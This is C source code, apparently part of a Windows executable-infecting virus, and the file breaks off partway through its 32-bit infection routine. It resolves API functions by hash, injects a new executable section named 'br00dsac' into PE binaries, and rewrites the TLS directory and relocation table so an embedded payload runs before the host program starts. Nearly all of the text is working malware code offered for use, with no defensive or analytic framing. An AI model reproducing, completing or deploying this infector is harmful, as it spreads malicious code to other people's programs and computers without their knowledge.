#include <stdint.h>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <shlobj.h>
#include "infections.h"

/* Microsoft hates people like us so they don't define everything in their headers,
   but we are resilient and share C headers, copy these headers to piss off a Microsoft dev */
typedef struct FULL_PEB_LDR_DATA
{
   ULONG Length;
   BOOLEAN Initialized;
   HANDLE SsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   PVOID EntryInProgress;
   BOOLEAN ShutdownInProgress;
   HANDLE ShutdownThreadId;
} FULL_PEB_LDR_DATA, *PFULL_PEB_LDR_DATA;

typedef struct FULL_LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     WORD LoadCount;
     WORD TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     PVOID EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;

typedef void * (* mallocHeader)(size_t);
typedef void * (* reallocHeader)(void *, size_t);
typedef void (* freeHeader)(void *);
typedef char * (* strncatHeader)(char *, const char *, size_t);
typedef int (* strnicmpHeader)(const char *, const char *, size_t);
typedef size_t (* strlenHeader)(const char *);
typedef void * (* memcpyHeader)(void *, const void *, size_t);
typedef void * (* memsetHeader)(void *, int, size_t);
typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
typedef DWORD (* GetTempPath2AHeader)(DWORD, LPSTR);
typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
typedef HANDLE (* CreateFileAHeader)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD (* GetFileSizeHeader)(HANDLE, LPDWORD);
typedef BOOL (* ReadFileHeader)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (* WriteFileHeader)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (* CloseHandleHeader)(HANDLE);
typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);

typedef struct __InfectorIAT
{
   /* msvcrt */
   mallocHeader malloc;
   reallocHeader realloc;
   freeHeader free;
   strncatHeader strncat;
   strnicmpHeader strnicmp;
   strlenHeader strlen;
   memcpyHeader memcpy;
   memsetHeader memset;

   /* kernel32 */
   LoadLibraryAHeader loadLibrary;
   FindFirstFileAHeader findFirstFile;
   FindNextFileAHeader findNextFile;
   CreateFileAHeader createFile;
   GetFileSizeHeader getFileSize;
   ReadFileHeader readFile;
   WriteFileHeader writeFile;
   CloseHandleHeader closeHandle;

   /* shell32 */
   SHGetFolderPathAHeader getFolderPath;
} InfectorIAT;

/* the CVector functionality provides a basic C-style version of the vector object
 * in C++. understanding their functionality should be pretty straight-forward to
 * understand. */
typedef struct __CVector
{
   size_t type_size;
   size_t elements;
   void *data;
} CVector;

/* some glue that makes C casting a little less ugly */
#define RECAST(t,e) ((t)(e))
#define CVECTOR_CAST(v,t) RECAST(t,(v)->data)
#define CVECTOR_BYTES(v) ((v)->type_size * (v)->elements)

/* allocate a CVector object on the heap */
CVector cvector_alloc(InfectorIAT *iat, size_t type_size, size_t elements)
{
   CVector result;
   result.type_size = 0;
   result.elements = 0;
   result.data = NULL;

   if (type_size == 0)
      return result;

   result.type_size = type_size;

   if (elements == 0)
      return result;

   result.elements = elements;
   result.data = iat->malloc(CVECTOR_BYTES(&result));
   iat->memset(result.data, 0, CVECTOR_BYTES(&result));
   return result;
}

/* free the CVector from the heap */
void cvector_free(InfectorIAT *iat, CVector *vector)
{
   if (vector == NULL || vector->data == NULL)
      return;

   iat->memset(vector->data, 0, CVECTOR_BYTES(vector));
   iat->free(vector->data);
   vector->data = NULL;
   vector->elements = 0;
}

/* reallocate a CVector object */
void cvector_realloc(InfectorIAT *iat, CVector *vector, size_t elements)
{
   if (vector == NULL)
      return;
   
   if (elements == 0 || elements == vector->elements)
   {
      cvector_free(iat, vector);
      return;
   }

   size_t old_elements = vector->elements;
   vector->elements = elements;
   vector->data = iat->realloc(vector->data, CVECTOR_BYTES(vector));

   if (old_elements < elements)
      iat->memset(CVECTOR_CAST(vector, uint8_t *)+(vector->type_size * old_elements), 0, (elements - old_elements) * vector->type_size);
}

/* insert an element into the C-vector at the given index within the vector */
void cvector_insert(InfectorIAT *iat, CVector *vector, size_t index, void *element)
{
   if (vector == NULL || element == NULL)
      return;

   if (index > vector->elements && vector->elements != 0)
      return;

   if (vector->data == NULL)
   {
      *vector = cvector_alloc(iat, vector->type_size, 1);
      iat->memcpy(vector->data, element, vector->type_size);
      return;
   }

   cvector_realloc(iat, vector, vector->elements+1);

   if (index != vector->elements)
   {
      /* we do it this way to prevent doing another malloc/free just to insert */
      for (size_t i=1; i<vector->elements-index; ++i)
      {
         size_t src_index = vector->elements-i-1;
         size_t dst_index = vector->elements-i;
         void *src = RECAST(void *, CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * src_index));
         void *dst = RECAST(void *, CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * dst_index));
         iat->memcpy(dst, src, vector->type_size);
      }
   }

   iat->memcpy(CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * index), element, vector->type_size);
}

/* remove an element from the CVector */
void cvector_remove(InfectorIAT *iat, CVector *vector, size_t index)
{
   if (vector == NULL || index >= vector->elements)
      return;

   if (index != vector->elements-1)
      iat->memcpy(CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * index),
                  CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * (index+1)),
                  vector->type_size * (vector->elements-index-1));
   
   cvector_realloc(iat, vector, vector->elements-1);
}

/* push an element at the end of the CVector */
void cvector_push(InfectorIAT *iat, CVector *vector, void *element)
{
   if (vector == NULL || element == NULL)
      return;

   cvector_insert(iat, vector, vector->elements, element);
}

/* remove an element from the front of the CVector */
void cvector_dequeue(InfectorIAT *iat, CVector *vector, void *element)
{
   if (vector == NULL)
      return;

   if (element != NULL)
      iat->memcpy(element, vector->data, vector->type_size);

   cvector_remove(iat, vector, 0);
}

uint32_t fnv321a(const char *string)
{
   uint32_t hashval = 0x811c9dc5;

   while (*string != 0)
   {
      hashval ^= *string++;
      hashval *= 0x1000193;
   }

   return hashval;
}

LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, uint32_t hash)
{
   /* the export directory of a PE file essentially contains an index of named
    * functions provided by the DLL. there is a name array, an index array, and
    * a function array. the index of the name array correlates to the index of the
    * index array (known as the ordinal array), which provides the index into the
    * function array containing our target function, which is an rva address to the
    * target function's code. this function effectively performs an fnv321a hash on
    * the name of the functions in the dll until it finds its target, otherwise it
    * returns null. */
   
   const IMAGE_NT_HEADERS *nt_headers = RECAST(const IMAGE_NT_HEADERS *, RECAST(const uint8_t *,module)+module->e_lfanew);
   const IMAGE_EXPORT_DIRECTORY *export_directory = RECAST(const IMAGE_EXPORT_DIRECTORY *,
                                                           RECAST(const uint8_t *,module)+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
   const DWORD *name_pointers = RECAST(const DWORD *,RECAST(const uint8_t *,module)+export_directory->AddressOfNames);
   const WORD *name_ordinals = RECAST(const WORD *,RECAST(const uint8_t *,module)+export_directory->AddressOfNameOrdinals);
   const DWORD *functions = RECAST(const DWORD *,RECAST(const uint8_t *,module)+export_directory->AddressOfFunctions);

   for (uint32_t i=0; i<export_directory->NumberOfNames; ++i)
   {
      const char *name = RECAST(const char *,RECAST(const uint8_t *,module)+name_pointers[i]);

      if (fnv321a(name) != hash)
         continue;

      return RECAST(LPCVOID,RECAST(const uint8_t *,module)+functions[name_ordinals[i]]);
   }

   return NULL;
}

/* convert a given RVA in a module object to an offset */
DWORD rva_to_offset(CVector *module, DWORD rva)
{
   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,CVECTOR_CAST(module, uint8_t *)+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,CVECTOR_CAST(module, uint8_t *)+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);

   for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
   {
      if (rva >= section_table[i].VirtualAddress && rva < section_table[i].VirtualAddress+section_table[i].Misc.VirtualSize)
         return rva - section_table[i].VirtualAddress + section_table[i].PointerToRawData;
   }

   return 0;
}

/* create the relocations in the relocation table necessary for our injected TLS directory */
void create_tls_relocations(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEADER *new_section, CVector *new_section_data, BOOL arch_switch)
{
   uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);

   union
   {
      PIMAGE_NT_HEADERS64 nt64;
      PIMAGE_NT_HEADERS32 nt32;
   } nt_headers;

   /* get the NT headers for each arch */
   if (arch_switch)
      nt_headers.nt64 = RECAST(PIMAGE_NT_HEADERS64,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
   else
      nt_headers.nt32 = RECAST(PIMAGE_NT_HEADERS32,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
   
   union
   {
      PIMAGE_TLS_DIRECTORY64 tls64;
      PIMAGE_TLS_DIRECTORY32 tls32;
   } tls_ptr;

   /* get the TLS headers for each arch */
   if (arch_switch)
      tls_ptr.tls64 = CVECTOR_CAST(new_section_data, PIMAGE_TLS_DIRECTORY64);
   else
      tls_ptr.tls32 = CVECTOR_CAST(new_section_data, PIMAGE_TLS_DIRECTORY32);
   
   /* the tls directory has four va addresses that need relocating, so add those rvas to the relocations */
   CVector relocations = cvector_alloc(iat, sizeof(DWORD), 0);
   DWORD target_rva = new_section->VirtualAddress;
   
   for (size_t i=0; i<4; ++i)
   {
      cvector_push(iat, &relocations, &target_rva);

      if (arch_switch)
         target_rva += 8;
      else
         target_rva += 4;
   }
   
   /* create relocations for all the callbacks in the tls directory */
   if (arch_switch)
   {
      DWORD callback_rva = tls_ptr.tls64->AddressOfCallBacks - nt_headers.nt64->OptionalHeader.ImageBase;
      DWORD tls_callback_offset = callback_rva - new_section->VirtualAddress;
      uintptr_t *callback_ptr = RECAST(uintptr_t *, CVECTOR_CAST(new_section_data, uint8_t *)+tls_callback_offset);

      while (*callback_ptr != 0)
      {
         cvector_push(iat, &relocations, &callback_rva);
         callback_rva += sizeof(uintptr_t);
         callback_ptr++;
      }
   }
   else
   {
      DWORD callback_rva = tls_ptr.tls32->AddressOfCallBacks - nt_headers.nt32->OptionalHeader.ImageBase;
      DWORD tls_callback_offset = callback_rva - new_section->VirtualAddress;
      uint32_t *callback_ptr = RECAST(uint32_t *, CVECTOR_CAST(new_section_data, uint8_t *)+tls_callback_offset);

      while (*callback_ptr != 0)
      {
         cvector_push(iat, &relocations, &callback_rva);
         callback_rva += sizeof(uint32_t);
         callback_ptr++;
      }
   }

   /* determine the last relocation in the original relocation table */
   DWORD reloc_offset;

   if (arch_switch)
   {
      reloc_offset = rva_to_offset(module,
                                   nt_headers.nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
   }
   else
   {
      reloc_offset = rva_to_offset(module,
                                   nt_headers.nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
   }
   
   PIMAGE_BASE_RELOCATION base_relocation = RECAST(PIMAGE_BASE_RELOCATION, byte_module+reloc_offset);

   while (base_relocation->VirtualAddress != 0)
      base_relocation = RECAST(PIMAGE_BASE_RELOCATION,RECAST(uint8_t *, base_relocation)+base_relocation->SizeOfBlock);

   /* create a new relocation block */
   DWORD block_size = relocations.elements * sizeof(WORD) + sizeof(DWORD) * 2;

   if (arch_switch)
      nt_headers.nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size += block_size;
   else
      nt_headers.nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size += block_size;
   
   base_relocation->VirtualAddress = CVECTOR_CAST(&relocations,DWORD *)[0] & 0xFFFFF000;
   base_relocation->SizeOfBlock = block_size;

   /* iterate over our relocation rvas and patch them into the relocation table */
   WORD *relocation_array = RECAST(WORD *,RECAST(uint8_t *,base_relocation)+sizeof(DWORD)*2);

   for (size_t i=0; i<relocations.elements; ++i)
   {
      if (arch_switch)
      {
         /* create an ABSOLUTE relocation */
         relocation_array[i] = (10 << 12) | (CVECTOR_CAST(&relocations, DWORD *)[i] & 0xFFF);
      }
      else
      {
         /* create a HIGHLOW relocation */
         relocation_array[i] = (3 << 12) | (CVECTOR_CAST(&relocations, DWORD *)[i] & 0xFFF);
      }
   }

   cvector_free(iat, &relocations);
}

CVector create_32bit_tls_section(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEADER *new_section)
{
   uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
   
   size_t new_section_size = 0;

   /* begin creating the new tls directory */
   new_section_size += sizeof(IMAGE_TLS_DIRECTORY32);

   PIMAGE_TLS_DIRECTORY32 old_tls_directory = NULL;
   IMAGE_TLS_DIRECTORY32 new_tls_directory;

   /* if there is already a tls directory, copy it */
   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0)
   {
      old_tls_directory = RECAST(PIMAGE_TLS_DIRECTORY32,byte_module+rva_to_offset(module,
                                                                                  nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress));
      iat->memcpy(&new_tls_directory, old_tls_directory, sizeof(IMAGE_TLS_DIRECTORY64));
   }

   /* create the tls data vector and the callback vector */
   CVector tls_data = cvector_alloc(iat, sizeof(uint8_t), 1);
   CVector tls_callbacks = cvector_alloc(iat, sizeof(uint32_t), 0);

   /* if there is an old tls directory and an old set of data, copy it */
   if (old_tls_directory != NULL && old_tls_directory->StartAddressOfRawData != 0)
   {
      cvector_realloc(iat, &tls_data, old_tls_directory->EndAddressOfRawData - old_tls_directory->StartAddressOfRawData);
      DWORD data_rva = old_tls_directory->StartAddressOfRawData - nt_headers->OptionalHeader.ImageBase;
      iat->memcpy(tls_data.data, byte_module+rva_to_offset(module, data_rva), tls_data.elements);
   }

   /* if there are callbacks in the old tls directory, copy them */
   if (old_tls_directory != NULL && old_tls_directory->AddressOfCallBacks != 0)
   {
      DWORD callback_rva = old_tls_directory->AddressOfCallBacks - nt_headers->OptionalHeader.ImageBase;
      uint32_t *callback_array = RECAST(uint32_t *,byte_module+rva_to_offset(module, callback_rva));

      do
      {
         cvector_push(iat, &tls_callbacks, callback_array++);

         if (*callback_array == 0)
            cvector_push(iat, &tls_callbacks, callback_array);
      } while (*callback_array != 0);
   }

   /* align the data on an arbitrary 4-byte boundary, because I am neurotic */
   size_t aligned_tls_data_size = tls_data.elements;
   
   if (aligned_tls_data_size % 4 != 0)
      aligned_tls_data_size += (4 - aligned_tls_data_size % 4);

   /* establish the pointers for the data in the tls directory */
   DWORD tls_data_offset = new_section_size;
   DWORD tls_data_start_rva = new_section->VirtualAddress + tls_data_offset;
   DWORD tls_data_end_rva = tls_data_start_rva + tls_data.elements;
   new_section_size += aligned_tls_data_size;
   new_tls_directory.StartAddressOfRawData = tls_data_start_rva + nt_headers->OptionalHeader.ImageBase;
   new_tls_directory.EndAddressOfRawData = tls_data_end_rva + nt_headers->OptionalHeader.ImageBase;

   /* create the tls index object */
   DWORD tls_index_offset = new_section_size;
   DWORD tls_index_rva = new_section->VirtualAddress + tls_index_offset;
   new_section_size += sizeof(DWORD);
   new_tls_directory.AddressOfIndex = tls_index_rva + nt_headers->OptionalHeader.ImageBase;

   /* create our infection callback and insert it at the beginning of the callback array */
   DWORD tls_callback_offset = new_section_size;
   DWORD tls_callback_rva = new_section->VirtualAddress + tls_callback_offset;
   uint32_t placeholder = 0xABAD1DEA;
   cvector_insert(iat, &tls_callbacks, 0, &placeholder);

   /* null terminate the callback array if it's not already */
   if (CVECTOR_CAST(&tls_callbacks, uint32_t *)[tls_callbacks.elements-1] != 0)
   {
      uintptr_t zero = 0;
      cvector_push(iat, &tls_callbacks, &zero);
   }

   /* set the new address of the tls callbacks */
   new_section_size += CVECTOR_BYTES(&tls_callbacks) + 16; // add 16 bytes padding because it would be weird to have assembly directly after (again, neurotic)
   new_tls_directory.AddressOfCallBacks = tls_callback_rva + nt_headers->OptionalHeader.ImageBase;

   /* replace our placeholder value with the new va address of our callback and accomodate our payload */
   DWORD tls_infection_offset = new_section_size;
   DWORD tls_infection_rva = new_section->VirtualAddress + tls_infection_offset;
   CVECTOR_CAST(&tls_callbacks, uint32_t *)[0] = tls_infection_rva + nt_headers->OptionalHeader.ImageBase;
   new_section_size += INFECTION32_SIZE;

   /* set the new section size */
   new_section->Misc.VirtualSize = RECAST(DWORD, new_section_size);
   new_section->SizeOfRawData = RECAST(DWORD, new_section_size);

   /* align the section size to the file alignment boundary */
   if (new_section->SizeOfRawData % nt_headers->OptionalHeader.FileAlignment != 0)
      new_section->SizeOfRawData += (nt_headers->OptionalHeader.FileAlignment - (new_section->SizeOfRawData % nt_headers->OptionalHeader.FileAlignment));

   /* set the characteristics and name of the section */
   new_section->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
   iat->memcpy(new_section->Name, "br00dsac", 8);

   /* set the tls directory pointer in our binary */
   nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = new_section->VirtualAddress;
   nt_headers->OptionalHeader.SizeOfImage = 0;
   DWORD lowest_rva = 0xFFFFFFFF;

   /* determine the offset of the first significant section by calculating the lowest rva
    * while simultaneously determining the size of the image (this is to appropriately calculate
    * the header size in memory)
    */
   for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
   {
      nt_headers->OptionalHeader.SizeOfImage += section_table[i].Misc.VirtualSize;

      if (nt_headers->OptionalHeader.SizeOfImage % nt_headers->OptionalHeader.SectionAlignment != 0)
         nt_headers->OptionalHeader.SizeOfImage +=
            nt_headers->OptionalHeader.SectionAlignment - (nt_headers->OptionalHeader.SizeOfImage % nt_headers->OptionalHeader.SectionAlignment);

      if (section_table[i].VirtualAddress < lowest_rva)
         lowest_rva = section_table[i].VirtualAddress;
   }

   /* the lowest rva of the sections contains the functional end of the headers */
   nt_headers->OptionalHeader.SizeOfImage += lowest_rva;

   /* create the new section and copy all the relevant data */
   CVector new_section_data = cvector_alloc(iat, sizeof(uint8_t), new_section->SizeOfRawData);
   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *), &new_tls_directory, sizeof(IMAGE_TLS_DIRECTORY32));
   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_data_offset, tls_data.data, CVECTOR_BYTES(&tls_data));
   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_callback_offset, tls_callbacks.data, CVECTOR_BYTES(&tls_callbacks));
   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_infection_offset, INFECTION32, INFECTION32_SIZE);

   cvector_free(iat, &tls_data);
   cvector_free(iat, &tls_callbacks);

   return new_section_data;
}

CVector create_64bit_tls_section(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEADER *new_section)
{
   uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
   PIMAGE_NT_HEADERS64 nt_headers = RECAST(PIMAGE_NT_HEADERS64,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
   
   size_t new_section_size = 0;

   /* begin creating the new tls directory */
   new_section_size += sizeof(IMAGE_TLS_DIRECTORY64);

   PIMAGE_TLS_DIRECTORY64 old_tls_directory = NULL;
   IMAGE_TLS_DIRECTORY64 new_tls_directory;

   /* if there is already a tls directory, copy it */
   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0)
   {
      old_tls_directory = RECAST(PIMAGE_TLS_DIRECTORY64,byte_module+rva_to_offset(module,
                                                                                  nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress));
      iat->memcpy(&new_tls_directory, old_tls_directory, sizeof(IMAGE_TLS_DIRECTORY64));
   }

   /* create the tls data vector and the callback vector */
   CVector tls_data = cvector_alloc(iat, sizeof(uint8_t), 1);
   CVector tls_callbacks = cvector_alloc(iat, sizeof(uintptr_t), 0);

   /* if there is an old tls directory and an old set of data, copy it */
   if (old_tls_directory != NULL && old_tls_directory->StartAddressOfRawData != 0)
   {
      cvector_realloc(iat, &tls_data, old_tls_directory->EndAddressOfRawData - old_tls_directory->StartAddressOfRawData);
      DWORD data_rva = old_tls_directory->StartAddressOfRawData - nt_headers->OptionalHeader.ImageBase;
      iat->memcpy(tls_data.data, byte_module+rva_to_offset(module, data_rva), tls_data.elements);
   }

   /* if there are callbacks in the old tls directory, copy them */
   if (old_tls_directory != NULL && old_tls_directory->AddressOfCallBacks != 0)
   {
      DWORD callback_rva = old_tls_directory->AddressOfCallBacks - nt_headers->OptionalHeader.ImageBase;
      uintptr_t *callback_array = RECAST(uintptr_t *,byte_module+rva_to_offset(module, callback_rva));

      do
      {
         cvector_push(iat, &tls_callbacks, callback_array++);

         if (*callback_array == 0)
            cvector_push(iat, &tls_callbacks, callback_array);
      } while (*callback_array != 0);
   }

   /* align the data on an arbitrary 4-byte boundary, because I am neurotic */
   size_t aligned_tls_data_size = tls_data.elements;
   
   if (aligned_tls_data_size % 4 != 0)
      aligned_tls_data_size += (4 - aligned_tls_data_size % 4);

   /* establish the pointers for the data in the tls directory */
   DWORD tls_data_offset = new_section_size;
   DWORD tls_data_start_rva = new_section->VirtualAddress + tls_data_offset;
   DWORD tls_data_end_rva = tls_data_start_rva + tls_data.elements;
   new_section_size += aligned_tls_data_size;
   new_tls_directory.StartAddressOfRawData = tls_data_start_rva + nt_headers->OptionalHeader.ImageBase;
   new_tls_directory.EndAddressOfRawData = tls_data_end_rva + nt_headers->OptionalHeader.ImageBase;

   /* create the tls index object */
   DWORD tls_index_offset = new_section_size;
   DWORD tls_index_rva = new_section->VirtualAddress + tls_index_offset;
   new_section_size += sizeof(DWORD);
   new_tls_directory.AddressOfIndex = tls_index_rva + nt_headers->OptionalHeader.ImageBase;

   /* create our infection callback and insert it at the beginning of the callback array */
   DWORD tls_callback_offset = new_section_size;
   DWORD tls_callback_rva = new_section->VirtualAddress + tls_callback_offset;
   uintptr_t placeholder = 0xC01DC0FFEE;
   cvector_insert(iat, &tls_callbacks, 0, &placeholder);

   /* null terminate the callback array if it's not already */
   if (CVECTOR_CAST(&tls_callbacks, uintptr_t *)[tls_callbacks.elements-1] != 0)
   {
      uintptr_t zero = 0;
      cvector_push(iat, &tls_callbacks, &zero);
   }

   /* set the new address of the tls callbacks */
   new_section_size += CVECTOR_BYTES(&tls_callbacks) + 16; // add 16 bytes padding because it would be weird to have assembly directly after (again, neurotic)
   new_tls_directory.AddressOfCallBacks = tls_callback_rva + nt_headers->OptionalHeader.ImageBase;

   /* replace our placeholder value with the new va address of our callback and accomodate our payload */
   DWORD tls_infection_offset = new_section_size;
   DWORD tls_infection_rva = new_section->VirtualAddress + tls_infection_offset;
   CVECTOR_CAST(&tls_callbacks, uintptr_t *)[0] = tls_infection_rva + nt_headers->OptionalHeader.ImageBase;
   new_section_size += INFECTION64_SIZE;

   /* set the new section size */
   new_section->Misc.VirtualSize = RECAST(DWORD, new_section_size);
   new_section->SizeOfRawData = RECAST(DWORD, new_section_size);

   /* align the section size to the file alignment boundary */
   if (new_section->SizeOfRawData % nt_headers->OptionalHeader.FileAlignment != 0)
      new_section->SizeOfRawData += (nt_headers->OptionalHeader.FileAlignment - (new_section->SizeOfRawData % nt_headers->OptionalHeader.FileAlignment));

   /* set the characteristics and name of the section */
   new_section->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
   iat->memcpy(new_section->Name, "br00dsac", 8);

   /* set the tls directory pointer in our binary */
   nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = new_section->VirtualAddress;
   nt_headers->OptionalHeader.SizeOfImage = 0;
   DWORD lowest_rva = 0xFFFFFFFF;

   /* determine the offset of the first significant section by calculating the lowest rva
    * while simultaneously determining the size of the image (this is to appropriately calculate
    * the header size in memory)
    */
   for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
   {
      nt_headers->OptionalHeader.SizeOfImage += section_table[i].Misc.VirtualSize;

      if (nt_headers->OptionalHeader.SizeOfImage % nt_headers->OptionalHeader.SectionAlignment != 0)
         nt_headers->OptionalHeader.SizeOfImage +=
            nt_headers->OptionalHeader.SectionAlignment - (nt_headers->OptionalHeader.SizeOfImage % nt_headers->OptionalHeader.SectionAlignment);

      if (section_table[i].VirtualAddress < lowest_rva)
         lowest_rva = section_table[i].VirtualAddress;
   }

   /* the lowest rva of the sections contains the functional end of the headers */
   nt_headers->OptionalHeader.SizeOfImage += lowest_rva;

   /* create the new section and copy all the relevant data */
   CVector new_section_data = cvector_alloc(iat, sizeof(uint8_t), new_section->SizeOfRawData);
   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *), &new_tls_directory, sizeof(IMAGE_TLS_DIRECTORY64));
   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_data_offset, tls_data.data, CVECTOR_BYTES(&tls_data));
   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_callback_offset, tls_callbacks.data, CVECTOR_BYTES(&tls_callbacks));
   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_infection_offset, INFECTION64, INFECTION64_SIZE);

   cvector_free(iat, &tls_data);
   cvector_free(iat, &tls_callbacks);

   return new_section_data;
}

CVector infect_32bit(InfectorIAT *iat, CVector *module)
{
   uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
   IMAGE_SECTION_HEADER *last_section = &section_table[nt_headers->FileHeader.NumberOfSections-1];
   IMAGE_SECTION_HEADER *new_section = &section_table[nt_headers->FileHeader.NumberOfSections];
   CVector result = cvector_alloc(iat, sizeof(uint8_t), 0);
   DWORD new_section_offset = last_section->PointerToRawData + last_section->SizeOfRawData;

   /* align the new section offset to the file alignment boundary */
   if (new_section_offset % nt_headers->OptionalHeader.FileAlignment != 0)
      new_section_offset += nt_headers->OptionalHeader.FileAlignment - (new_section_offset % nt_headers->OptionalHeader.FileAlignment);

   if (new_section_offset < module->elements) /* there's appended data to this binary, do not tamper */
      return result;

   /* increment the number of sections in the binary */
   nt_headers->FileHeader.NumberOfSections += 1;

   /* set the target address on the new section */
   new_section->PointerToRawData = new_section_offset;
   new_section->VirtualAddress = last_section->VirtualAddress + last_section->SizeOfRawData;

   /* align the new address on the virtual alignment boundary */
   if (new_section->VirtualAddress % nt_headers->OptionalHeader.SectionAlignment != 0)
      new_section->VirtualAddress += nt_headers->OptionalHeader.SectionAlignment - (new_section->VirtualAddress % nt_headers->OptionalHeader.SectionAlignment);

